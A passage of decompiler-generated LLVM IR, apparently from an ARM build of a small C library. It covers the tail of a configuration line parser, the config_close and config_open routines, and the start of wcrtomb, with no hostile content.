  %v3_129c4 = load i32, i32* %v2_129c4, align 4
  store i32 %v3_129c4, i32* %r0.global-to-local, align 4
  %v1_129c8 = inttoptr i32 %v3_129c4 to i32*
  %v2_129c8 = call i32 @realloc(i32* %v1_129c8)
  store i32 %v2_129c8, i32* %r0.global-to-local, align 4
  %v0_129cc = load i32, i32* @r5, align 4
  %v1_129cc = add i32 %v0_129cc, 8
  %v2_129cc = inttoptr i32 %v1_129cc to i32*
  %v3_129cc = load i32, i32* %v2_129cc, align 4
  %v2_129d0 = add i32 %v3_129cc, %v2_129c8
  store i32 %v2_129d0, i32* %r3.global-to-local, align 4
  %v2_129d4 = add i32 %v0_129cc, 12
  %v3_129d4 = inttoptr i32 %v2_129d4 to i32*
  store i32 %v2_129d0, i32* %v3_129d4, align 4
  %v1_129d8 = load i32, i32* @r5, align 4
  %v2_129d8 = add i32 %v1_129d8, 4
  %v3_129d8 = inttoptr i32 %v2_129d8 to i32*
  store i32 %v2_129c8, i32* %v3_129d8, align 4
  %v0_1292c.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12924

dec_label_pc_129e0:                               ; preds = %dec_label_pc_129a4, %.dec_label_pc_129e0_crit_edge
  %v0_129e0 = phi i32 [ %v0_129e0.pre, %.dec_label_pc_129e0_crit_edge ], [ %v0_129a4, %dec_label_pc_129a4 ]
  %v1_129e0 = inttoptr i32 %v0_129e0 to i32*
  %v2_129e0 = load i32, i32* %v1_129e0, align 4
  store i32 %v2_129e0, i32* @r1, align 4
  %v1_129e4 = add i32 %v2_129e0, 52
  %v2_129e4 = inttoptr i32 %v1_129e4 to i32*
  %v3_129e4 = load i32, i32* %v2_129e4, align 4
  store i32 %v3_129e4, i32* %r3.global-to-local, align 4
  %v2_129e8 = icmp eq i32 %v3_129e4, 0
  store i1 %v2_129e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_129e8, label %dec_label_pc_12a14, label %dec_label_pc_129f0

dec_label_pc_129f0:                               ; preds = %dec_label_pc_129e0
  %v1_129f0 = add i32 %v2_129e0, 16
  %v2_129f0 = inttoptr i32 %v1_129f0 to i32*
  %v3_129f0 = load i32, i32* %v2_129f0, align 4
  store i32 %v3_129f0, i32* %r2.global-to-local, align 4
  %v1_129f4 = add i32 %v2_129e0, 24
  %v2_129f4 = inttoptr i32 %v1_129f4 to i32*
  %v3_129f4 = load i32, i32* %v2_129f4, align 4
  store i32 %v3_129f4, i32* %r3.global-to-local, align 4
  %v3_129f8 = icmp ult i32 %v3_129f0, %v3_129f4
  %v9_129f8 = icmp eq i32 %v3_129f0, %v3_129f4
  store i1 %v9_129f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_129f8, label %dec_label_pc_12a1cthread-pre-split, label %dec_label_pc_12a08

dec_label_pc_12a08:                               ; preds = %dec_label_pc_129f0
  store i32 %v2_129e0, i32* %r0.global-to-local, align 4
  %v1_12a0c = inttoptr i32 %v2_129e0 to i16*
  %v2_12a0c = call i32 @getc_unlocked(i16* %v1_12a0c)
  store i32 %v2_12a0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12a1c

dec_label_pc_12a14:                               ; preds = %dec_label_pc_129e0
  store i32 %v2_129e0, i32* %r0.global-to-local, align 4
  %v1_12a18 = call i32 @__GI_fgetc(i32 %v2_129e0)
  store i32 %v1_12a18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12a1c

dec_label_pc_12a1cthread-pre-split:               ; preds = %dec_label_pc_129f0
  %v2_129fc = inttoptr i32 %v3_129f0 to i8*
  %v3_129fc = load i8, i8* %v2_129fc, align 1
  %v4_129fc = zext i8 %v3_129fc to i32
  store i32 %v4_129fc, i32* %r0.global-to-local, align 4
  %v6_129fc = add i32 %v3_129f0, 1
  store i32 %v6_129fc, i32* %r2.global-to-local, align 4
  store i32 %v6_129fc, i32* %v2_129f0, align 4
  %v0_12a1c.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12a1c

dec_label_pc_12a1c:                               ; preds = %dec_label_pc_12a1cthread-pre-split, %dec_label_pc_12a08, %dec_label_pc_12a14
  %v1_12a20 = phi i32 [ %v0_12a1c.pr, %dec_label_pc_12a1cthread-pre-split ], [ %v2_12a0c, %dec_label_pc_12a08 ], [ %v1_12a18, %dec_label_pc_12a14 ]
  %v7_12a1c = icmp eq i32 %v1_12a20, 10
  store i1 %v7_12a1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12a1c, label %dec_label_pc_12a28.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_12a1c
  %v8_12a20 = icmp eq i32 %v1_12a20, -1
  store i1 %v8_12a20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_12a20, label %dec_label_pc_12a28.loopexit, label %.dec_label_pc_129e0_crit_edge

.dec_label_pc_129e0_crit_edge:                    ; preds = %bb66
  %v0_129e0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_129e0

dec_label_pc_12a28.loopexit:                      ; preds = %bb66, %dec_label_pc_12a1c
  %v0_12a28.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12a28

dec_label_pc_12a28:                               ; preds = %dec_label_pc_12980, %dec_label_pc_12a28.loopexit
  %v0_12a28 = phi i32 [ %v0_12a28.pre, %dec_label_pc_12a28.loopexit ], [ %v1_12994, %dec_label_pc_12980 ]
  %v7_12a28 = icmp eq i32 %v0_12a28, -1
  store i1 %v7_12a28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12a28, label %dec_label_pc_12b70, label %dec_label_pc_12a30

dec_label_pc_12a30:                               ; preds = %dec_label_pc_12a28
  store i32 %v1_12898, i32* %r3.global-to-local, align 4
  store i1 %v2_12a34, i1* %cpsr_z.global-to-local, align 1
  %v0_12a38 = load i32, i32* @r5, align 4
  %v1_12a38 = add i32 %v0_12a38, 12
  %v2_12a38 = inttoptr i32 %v1_12a38 to i32*
  %v3_12a38 = load i32, i32* %v2_12a38, align 4
  store i32 %v3_12a38, i32* @r4, align 4
  br i1 %v2_12a34, label %dec_label_pc_12a50, label %dec_label_pc_12a40

dec_label_pc_12a40:                               ; preds = %dec_label_pc_12a30
  store i32 %v3_12a38, i32* @r0, align 4
  %v1_12a48 = inttoptr i32 %v3_12a38 to i8*
  %v2_12a48 = call i32 @__GI_strspn(i8* %v1_12a48)
  store i32 %v2_12a48, i32* %r0.global-to-local, align 4
  %v0_12a4c = load i32, i32* @r4, align 4
  %v2_12a4c = add i32 %v0_12a4c, %v2_12a48
  store i32 %v2_12a4c, i32* @r4, align 4
  br label %dec_label_pc_12a50

dec_label_pc_12a50:                               ; preds = %dec_label_pc_12a30, %dec_label_pc_12a40
  %v0_12a50 = phi i32 [ %v3_12a38, %dec_label_pc_12a30 ], [ %v2_12a4c, %dec_label_pc_12a40 ]
  %v1_12a50 = inttoptr i32 %v0_12a50 to i8*
  %v2_12a50 = load i8, i8* %v1_12a50, align 1
  %v3_12a50 = zext i8 %v2_12a50 to i32
  store i32 %v3_12a50, i32* %r2.global-to-local, align 4
  %v2_12a54 = icmp eq i8 %v2_12a50, 0
  store i1 %v2_12a54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12a54, label %dec_label_pc_128c0.backedge, label %dec_label_pc_12a5c

dec_label_pc_128c0.backedge:                      ; preds = %dec_label_pc_12a50, %dec_label_pc_12a5c, %dec_label_pc_12b68
  %v0_128c0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_128c0

dec_label_pc_12a5c:                               ; preds = %dec_label_pc_12a50
  %v0_12a5c = load i32, i32* @r7, align 4
  %v1_12a5c = inttoptr i32 %v0_12a5c to i8*
  %v2_12a5c = load i8, i8* %v1_12a5c, align 1
  %v3_12a5c = zext i8 %v2_12a5c to i32
  store i32 %v3_12a5c, i32* %r3.global-to-local, align 4
  %v9_12a60 = icmp eq i8 %v2_12a5c, %v2_12a50
  store i1 %v9_12a60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12a60, label %dec_label_pc_128c0.backedge, label %dec_label_pc_12a68

dec_label_pc_12a68:                               ; preds = %dec_label_pc_12a5c
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_12a6c = load i32, i32* @r5, align 4
  %v1_12a6c = add i32 %v0_12a6c, 4
  %v2_12a6c = inttoptr i32 %v1_12a6c to i32*
  %v3_12a6c = load i32, i32* %v2_12a6c, align 4
  store i32 %v3_12a6c, i32* %r0.global-to-local, align 4
  %v0_12a70 = load i32, i32* @fp, align 4
  store i32 %v3_12a6c, i32* %v1_12a8c, align 4
  store i32 %v3_12884, i32* %r2.global-to-local, align 4
  %v3_12a7c = inttoptr i32 %v3_12a6c to i8*
  %v4_12a7c = call i32 @__GI_memset(i8* %v3_12a7c, i32 %v0_12a70, i32 %v3_12884)
  store i32 %v4_12a7c, i32* %r0.global-to-local, align 4
  %v0_12a80 = load i32, i32* @fp, align 4
  store i32 %v0_12a80, i32* @r6, align 4
  %v0_12b4012 = load i32, i32* @r4, align 4
  %v1_12b4013 = inttoptr i32 %v0_12b4012 to i8*
  %v2_12b4014 = load i8, i8* %v1_12b4013, align 1
  %v3_12b4015 = zext i8 %v2_12b4014 to i32
  store i32 %v3_12b4015, i32* %r2.global-to-local, align 4
  %v2_12b4416 = icmp eq i8 %v2_12b4014, 0
  store i1 %v2_12b4416, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12b4416, label %dec_label_pc_12b5c, label %dec_label_pc_12b4c

dec_label_pc_12a88:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_12a8c = load i32, i32* %v1_12a8c, align 4
  store i32 %v2_12a8c, i32* %r3.global-to-local, align 4
  store i32 %v1_1289c, i32* %r2.global-to-local, align 4
  %v9_12a94 = icmp eq i32 %v2_12a98, %v1_1289c
  store i1 %v9_12a94, i1* %cpsr_z.global-to-local, align 1
  %v5_12a98 = mul i32 %v2_12a98, 4
  %v6_12a98 = add i32 %v2_12a8c, %v5_12a98
  %v7_12a98 = inttoptr i32 %v6_12a98 to i32*
  store i32 %v0_12a98, i32* %v7_12a98, align 4
  br i1 %v9_12a94, label %dec_label_pc_12aa0, label %dec_label_pc_12aac

dec_label_pc_12aa0:                               ; preds = %dec_label_pc_12a88
  store i32 %v1_128a8, i32* %r3.global-to-local, align 4
  store i1 %v2_12aa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12aa4, label %dec_label_pc_12aac, label %dec_label_pc_12acc

dec_label_pc_12aac:                               ; preds = %dec_label_pc_12aa0, %dec_label_pc_12a88
  %v0_12aac = load i32, i32* @r7, align 4
  %v1_12aac = inttoptr i32 %v0_12aac to i8*
  %v2_12aac = load i8, i8* %v1_12aac, align 1
  %v3_12aac = zext i8 %v2_12aac to i32
  store i32 %v3_12aac, i32* %r3.global-to-local, align 4
  %v2_12ab0 = icmp eq i8 %v2_12aac, 0
  store i1 %v2_12ab0, i1* %cpsr_z.global-to-local, align 1
  %v0_12ab4 = load i32, i32* @r4, align 4
  store i32 %v0_12ab4, i32* @r0, align 4
  %v1_12ab8 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_12ab0, i32 %v1_12ab8, i32 %v0_12aac
  store i32 %storemerge, i32* @r1, align 4
  %v0_12ac0 = call i32 @strcspn()
  store i32 %v0_12ac0, i32* %r0.global-to-local, align 4
  %v0_12ac4 = load i32, i32* @r4, align 4
  %v2_12ac4 = add i32 %v0_12ac4, %v0_12ac0
  store i32 %v2_12ac4, i32* @r4, align 4
  br label %dec_label_pc_12b04

dec_label_pc_12acc:                               ; preds = %dec_label_pc_12aa0
  %v0_12acc = load i32, i32* @r4, align 4
  store i32 %v0_12acc, i32* @r0, align 4
  %v0_12ad0 = load i32, i32* @r7, align 4
  %v1_12ad0 = inttoptr i32 %v0_12ad0 to i8*
  %v2_12ad0 = load i8, i8* %v1_12ad0, align 1
  %v3_12ad0 = zext i8 %v2_12ad0 to i32
  %v5_12ad4 = call i32 @__GI_strchrnul(i32 %v0_12acc, i32 %v3_12ad0, i32 %v1_1289c, i32 %v1_128a8)
  store i32 %v5_12ad4, i32* %r0.global-to-local, align 4
  store i32 %v1_12898, i32* %r2.global-to-local, align 4
  store i1 %v2_12a34, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_12ad4, i32* @r4, align 4
  br i1 %v2_12a34, label %dec_label_pc_12b04, label %dec_label_pc_12af0

dec_label_pc_12aec:                               ; preds = %dec_label_pc_12af0
  %v1_12aec = add i32 %v0_12b04.pre, -1
  store i32 %v1_12aec, i32* @r4, align 4
  br label %dec_label_pc_12af0

dec_label_pc_12af0:                               ; preds = %dec_label_pc_12acc, %dec_label_pc_12aec
  %v0_12af0 = phi i32 [ %v1_12aec, %dec_label_pc_12aec ], [ %v5_12ad4, %dec_label_pc_12acc ]
  %v1_12af0 = add i32 %v0_12af0, -1
  %v2_12af0 = inttoptr i32 %v1_12af0 to i8*
  %v3_12af0 = load i8, i8* %v2_12af0, align 1
  %v4_12af0 = zext i8 %v3_12af0 to i32
  %v0_12af4 = load i32, i32* @sl, align 4
  store i32 %v0_12af4, i32* @r0, align 4
  %v2_12af8 = call i32 @__GI_strchr(i32 %v0_12af4, i32 %v4_12af0)
  store i32 %v2_12af8, i32* %r0.global-to-local, align 4
  %v2_12afc = icmp eq i32 %v2_12af8, 0
  store i1 %v2_12afc, i1* %cpsr_z.global-to-local, align 1
  %v0_12b04.pre = load i32, i32* @r4, align 4
  br i1 %v2_12afc, label %dec_label_pc_12b04, label %dec_label_pc_12aec

dec_label_pc_12b04:                               ; preds = %dec_label_pc_12af0, %dec_label_pc_12acc, %dec_label_pc_12aac
  %v3_12b10 = phi i32 [ %v5_12ad4, %dec_label_pc_12acc ], [ %v2_12ac4, %dec_label_pc_12aac ], [ %v0_12b04.pre, %dec_label_pc_12af0 ]
  %v1_12b04 = inttoptr i32 %v3_12b10 to i8*
  %v2_12b04 = load i8, i8* %v1_12b04, align 1
  %v3_12b04 = zext i8 %v2_12b04 to i32
  store i32 %v3_12b04, i32* %r2.global-to-local, align 4
  %v0_12b08 = load i32, i32* @r7, align 4
  %v1_12b08 = inttoptr i32 %v0_12b08 to i8*
  %v2_12b08 = load i8, i8* %v1_12b08, align 1
  %v3_12b08 = zext i8 %v2_12b08 to i32
  store i32 %v3_12b08, i32* %r3.global-to-local, align 4
  %v9_12b0c = icmp eq i8 %v2_12b08, %v2_12b04
  store i1 %v9_12b0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12b0c, label %bb69, label %dec_label_pc_12b18

bb69:                                             ; preds = %dec_label_pc_12b04
  %v1_12b10 = load i32, i32* @fp, align 4
  %v2_12b10 = trunc i32 %v1_12b10 to i8
  store i8 %v2_12b10, i8* %v1_12b04, align 1
  %v0_12b14.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12b14.pr, label %bb71, label %.dec_label_pc_12b18_crit_edge

.dec_label_pc_12b18_crit_edge:                    ; preds = %bb69
  %v0_12b18.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12b18

dec_label_pc_12b18:                               ; preds = %.dec_label_pc_12b18_crit_edge, %dec_label_pc_12b04
  %v0_12b18 = phi i32 [ %v0_12b18.pre, %.dec_label_pc_12b18_crit_edge ], [ %v3_12b04, %dec_label_pc_12b04 ]
  %v2_12b18 = icmp eq i32 %v0_12b18, 0
  store i1 %v2_12b18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12b18, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_12b18
  %v1_12b1c = load i32, i32* @fp, align 4
  %v2_12b1c = trunc i32 %v1_12b1c to i8
  %v3_12b1c = load i32, i32* @r4, align 4
  %v4_12b1c = inttoptr i32 %v3_12b1c to i8*
  store i8 %v2_12b1c, i8* %v4_12b1c, align 1
  %v5_12b1c = load i32, i32* @r4, align 4
  %v6_12b1c = add i32 %v5_12b1c, 1
  store i32 %v6_12b1c, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_12b18, %bb70
  %v2_12b20 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_12b20, i32* %r3.global-to-local, align 4
  %v2_12b24 = icmp eq i32 %v2_12b20, 0
  store i1 %v2_12b24, i1* %cpsr_z.global-to-local, align 1
  %v0_12b40.pre = load i32, i32* @r4, align 4
  br i1 %v2_12b24, label %dec_label_pc_12b3c, label %dec_label_pc_12b2c

dec_label_pc_12b2c:                               ; preds = %bb71
  store i32 %v0_12b40.pre, i32* @r0, align 4
  %v1_12b34 = inttoptr i32 %v0_12b40.pre to i8*
  %v2_12b34 = call i32 @__GI_strspn(i8* %v1_12b34)
  store i32 %v2_12b34, i32* %r0.global-to-local, align 4
  %v0_12b38 = load i32, i32* @r4, align 4
  %v2_12b38 = add i32 %v0_12b38, %v2_12b34
  store i32 %v2_12b38, i32* @r4, align 4
  br label %dec_label_pc_12b3c

dec_label_pc_12b3c:                               ; preds = %bb71, %dec_label_pc_12b2c
  %v0_12b40 = phi i32 [ %v2_12b38, %dec_label_pc_12b2c ], [ %v0_12b40.pre, %bb71 ]
  %v0_12b3c = load i32, i32* @r6, align 4
  %v1_12b3c = add i32 %v0_12b3c, 1
  store i32 %v1_12b3c, i32* @r6, align 4
  %v1_12b40 = inttoptr i32 %v0_12b40 to i8*
  %v2_12b40 = load i8, i8* %v1_12b40, align 1
  %v3_12b40 = zext i8 %v2_12b40 to i32
  store i32 %v3_12b40, i32* %r2.global-to-local, align 4
  %v2_12b44 = icmp eq i8 %v2_12b40, 0
  store i1 %v2_12b44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12b44, label %dec_label_pc_12b5c, label %dec_label_pc_12b4c

dec_label_pc_12b4c:                               ; preds = %dec_label_pc_12a68, %dec_label_pc_12b3c
  %v0_12a98 = phi i32 [ %v0_12b40, %dec_label_pc_12b3c ], [ %v0_12b4012, %dec_label_pc_12a68 ]
  %v2_12a98 = phi i32 [ %v1_12b3c, %dec_label_pc_12b3c ], [ %v0_12a80, %dec_label_pc_12a68 ]
  %v1_12b50 = phi i32 [ %v3_12b40, %dec_label_pc_12b3c ], [ %v3_12b4015, %dec_label_pc_12a68 ]
  %v0_12b4c = load i32, i32* @r7, align 4
  %v1_12b4c = inttoptr i32 %v0_12b4c to i8*
  %v2_12b4c = load i8, i8* %v1_12b4c, align 1
  %v3_12b4c = zext i8 %v2_12b4c to i32
  store i32 %v3_12b4c, i32* %r3.global-to-local, align 4
  %v9_12b50 = icmp eq i32 %v3_12b4c, %v1_12b50
  store i1 %v9_12b50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12b50, label %dec_label_pc_12b5c, label %bb72

bb72:                                             ; preds = %dec_label_pc_12b4c
  %v2_12b54 = load i32, i32* @sb, align 4
  %v3_12b54 = sub i32 %v2_12a98, %v2_12b54
  %v5_12b54 = xor i32 %v2_12b54, %v2_12a98
  %v6_12b54 = xor i32 %v3_12b54, %v2_12a98
  %v7_12b54 = and i32 %v6_12b54, %v5_12b54
  %v8_12b54 = icmp slt i32 %v7_12b54, 0
  %v9_12b54 = icmp slt i32 %v3_12b54, 0
  %v10_12b54 = icmp eq i32 %v2_12a98, %v2_12b54
  store i1 %v10_12b54, i1* %cpsr_z.global-to-local, align 1
  %v2_12b58 = xor i1 %v9_12b54, %v8_12b54
  br i1 %v2_12b58, label %dec_label_pc_12a88, label %dec_label_pc_12b5c

dec_label_pc_12b5c:                               ; preds = %dec_label_pc_12b4c, %dec_label_pc_12b3c, %bb72, %dec_label_pc_12a68
  %v0_12b60 = phi i32 [ %v0_12a80, %dec_label_pc_12a68 ], [ %v2_12a98, %dec_label_pc_12b4c ], [ %v1_12b3c, %dec_label_pc_12b3c ], [ %v2_12a98, %bb72 ]
  store i32 %v3_12880, i32* %r2.global-to-local, align 4
  %v9_12b60 = icmp eq i32 %v0_12b60, %v3_12880
  store i1 %v9_12b60, i1* %cpsr_z.global-to-local, align 1
  %v6_12b64 = icmp slt i32 %v0_12b60, %v3_12880
  br i1 %v6_12b64, label %dec_label_pc_12b68, label %dec_label_pc_12b74

dec_label_pc_12b68:                               ; preds = %dec_label_pc_12b5c
  %v0_12b68 = load i32, i32* @r8, align 4
  %v1_12b68 = and i32 %v0_12b68, 1048576
  %v2_12b68 = icmp eq i32 %v1_12b68, 0
  store i1 %v2_12b68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12b68, label %dec_label_pc_128c0.backedge, label %dec_label_pc_12b70

dec_label_pc_12b70:                               ; preds = %dec_label_pc_12b68, %dec_label_pc_12a28, %.thread, %entry
  br label %dec_label_pc_12b74

dec_label_pc_12b74:                               ; preds = %dec_label_pc_12b5c, %dec_label_pc_12944, %dec_label_pc_12b70
  %v0_12b74 = phi i32 [ %v0_12954, %dec_label_pc_12944 ], [ 0, %dec_label_pc_12b70 ], [ %v0_12b60, %dec_label_pc_12b5c ]
  store i32 %v0_12b74, i32* %r0.global-to-local, align 4
  store i32 %v3_1285c, i32* @r4, align 4
  store i32 %v6_1285c, i32* @r5, align 4
  store i32 %v9_1285c, i32* @r6, align 4
  store i32 %v12_1285c, i32* @r7, align 4
  store i32 %v15_1285c, i32* @r8, align 4
  store i32 %v18_1285c, i32* @sb, align 4
  store i32 %v21_1285c, i32* @sl, align 4
  store i32 %v24_1285c, i32* @fp, align 4
  ret i32 %v0_12b74

; uselistorder directives
  uselistorder i32 %v0_12b74, { 1, 0 }
  uselistorder i32 %v0_12b60, { 0, 2, 1 }
  uselistorder i32 %v3_12b54, { 1, 0 }
  uselistorder i32 %v2_12b54, { 1, 0, 2 }
  uselistorder i32 %v2_12a98, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_12b40.pre, { 0, 2, 1 }
  uselistorder i32 %v5_12ad4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12a80, { 1, 0, 2 }
  uselistorder i1 %v9_12a60, { 1, 0 }
  uselistorder i32 %v3_12a38, { 0, 2, 1, 3 }
  uselistorder i1 %v7_12a28, { 1, 0 }
  uselistorder i1 %v8_12a20, { 1, 0 }
  uselistorder i32 %v3_129f0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_129e0, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v2_129c8, { 1, 0, 2 }
  uselistorder i32 %v1_129b8, { 1, 0, 2 }
  uselistorder i32 %v0_129a4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1299c, { 1, 0 }
  uselistorder i32 %v1_12988, { 1, 0 }
  uselistorder i32 %v1_12984, { 1, 0 }
  uselistorder i32 %v2_12960, { 1, 0 }
  uselistorder i32 %v1_12944, { 2, 0, 1 }
  uselistorder i32 %v0_1292c, { 1, 0 }
  uselistorder i32 %v1_1291c, { 0, 2, 1 }
  uselistorder i32* %v1_12a8c, { 1, 0 }
  uselistorder i1 %v2_12a34, { 1, 0, 2, 3 }
  uselistorder i32 %v1_128a8, { 2, 0, 1, 3 }
  uselistorder i32 %v1_1289c, { 2, 1, 0 }
  uselistorder i32 %v3_12884, { 1, 2, 0 }
  uselistorder i32 %v3_12880, { 2, 1, 0 }
  uselistorder i32 %v1_12878, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 28, 26, 27, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_12b74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12b5c, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_12b4c, { 1, 0 }
  uselistorder label %dec_label_pc_12b3c, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12af0, { 1, 0 }
  uselistorder label %dec_label_pc_128c0.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12a50, { 1, 0 }
  uselistorder label %dec_label_pc_12a28, { 1, 0 }
  uselistorder label %dec_label_pc_12a1c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_129e0, { 1, 0 }
  uselistorder label %dec_label_pc_12914, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_12b88 = icmp eq i32* %arg1, null
  br i1 %v2_12b88, label %dec_label_pc_12bb0, label %dec_label_pc_12b90

dec_label_pc_12b90:                               ; preds = %entry
  %v2_12b90 = load i32, i32* %arg1, align 4
  %v1_12b94 = inttoptr i32 %v2_12b90 to i16*
  %v2_12b94 = call i32 @__GI_fclose(i16* %v1_12b94)
  %v0_12b98 = load i32, i32* @r4, align 4
  %v1_12b98 = add i32 %v0_12b98, 20
  %v2_12b98 = inttoptr i32 %v1_12b98 to i32*
  %v3_12b98 = load i32, i32* %v2_12b98, align 4
  %v2_12b9c = icmp eq i32 %v3_12b98, 0
  br i1 %v2_12b9c, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_12b90
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_12b90, %bb
  store i32 76712, i32* @lr, align 4
  %v1_12ba4 = xor i1 %v2_12b9c, true
  call void @__pseudo_cond_branch(i1 %v1_12ba4, i32 ptrtoint (i32* @global_var_f0a8.425 to i32))
  %v0_12ba8 = load i32, i32* @r4, align 4
  store i32 %v0_12ba8, i32* @r0, align 4
  %v0_12bac = call i32 @free()
  br label %dec_label_pc_12bb0

dec_label_pc_12bb0:                               ; preds = %entry, %bb6
  %v1_12bb4 = phi i32 [ 0, %entry ], [ %v0_12bac, %bb6 ]
  ret i32 %v1_12bb4

; uselistorder directives
  uselistorder label %dec_label_pc_12bb0, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12bc4 = load i32, i32* @r4, align 4
  store i32 %v3_12bc4, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -34020), i32* @r1, align 4
  %v0_12bcc = load i32, i32* @r0, align 4
  %v2_12bcc = call i32 @__GI_fopen(i32 %v0_12bcc, i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -34020))
  store i32 %v2_12bcc, i32* %r0.global-to-local, align 4
  store i32 %v2_12bcc, i32* @r4, align 4
  %v2_12bd0 = icmp eq i32 %v2_12bcc, 0
  br i1 %v2_12bd0, label %bb, label %dec_label_pc_12bdc

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_12bdc:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_12be4 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_12be4, i32* %r0.global-to-local, align 4
  %v2_12be8 = icmp eq i32 %v2_12be4, 0
  br i1 %v2_12be8, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_12bdc
  %v1_12bec = load i32, i32* @r4, align 4
  %v3_12bec = inttoptr i32 %v2_12be4 to i32*
  store i32 %v1_12bec, i32* %v3_12bec, align 4
  %v1_12bf4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_12bdc, %bb4
  %v1_12bf4 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_12bdc ], [ %v1_12bf4.pre, %bb4 ]
  %v2_12bf0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12bf0, i32* @r4, align 4
  ret i32 %v1_12bf4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 0, 2, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -34020), { 1, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_12c00 = load i32, i32* @lr, align 4
  %v2_12c04 = icmp eq i32 %arg1, 0
  br i1 %v2_12c04, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_12c0c = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_12c34 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_12c20 = phi i32 [ %arg1, %.thread ], [ %v3_12c0c, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_12c1c = ptrtoint i32* %stack_var_-12 to i32
